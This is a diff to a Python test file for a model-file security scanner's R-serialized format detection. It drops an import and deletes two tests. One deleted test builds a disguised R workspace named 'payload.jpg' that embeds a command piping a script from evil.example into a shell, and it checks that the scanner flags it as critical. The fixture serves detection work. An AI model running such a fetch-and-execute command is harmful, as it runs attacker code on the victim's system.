@@ -8,11 +8,7 @@ from modelaudit import core
 from modelaudit.scanners import get_scanner_for_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
-from modelaudit.utils.file.detection import (
-    detect_file_format,
-    detect_file_format_from_magic,
-    detect_format_from_extension,
-)
+from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension
 
 
 def _write_raw_r_serialized(path: Path, body: str, *, workspace_header: bool = False) -> None:
@@ -320,42 +316,3 @@ def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> N
     scanner = get_scanner_for_file(str(path))
     assert scanner is not None
     assert scanner.name == "r_serialized"
-
-
-def test_renamed_r_workspace_routes_and_detects_malicious_expression(tmp_path: Path) -> None:
-    path = tmp_path / "payload.jpg"
-    _write_raw_r_serialized(
-        path,
-        "\n".join(
-            [
-                "expression",
-                "language",
-                "base::system('curl https://evil.example/payload.sh | sh')",
-            ]
-        ),
-        workspace_header=True,
-    )
-
-    assert RSerializedScanner.can_handle(str(path))
-    assert detect_file_format(str(path)) == "r_serialized"
-    assert detect_file_format_from_magic(str(path)) == "r_serialized"
-
-    direct = core.scan_file(str(path))
-    assert direct.scanner_name == "r_serialized"
-    assert any(check.severity == IssueSeverity.CRITICAL for check in direct.checks)
-
-    directory = core.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
-    assert directory.files_scanned == 1
-    assert "r_serialized" in directory.scanner_names
-
-
-def test_renamed_r_workspace_near_match_remains_skipped(tmp_path: Path) -> None:
-    path = tmp_path / "notes.jpg"
-    path.write_bytes(b"RDX3\nQ\nordinary image metadata notes")
-
-    assert not RSerializedScanner.can_handle(str(path))
-    assert detect_file_format(str(path)) == "unknown"
-    assert detect_file_format_from_magic(str(path)) == "unknown"
-
-    directory = core.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
-    assert directory.files_scanned == 0
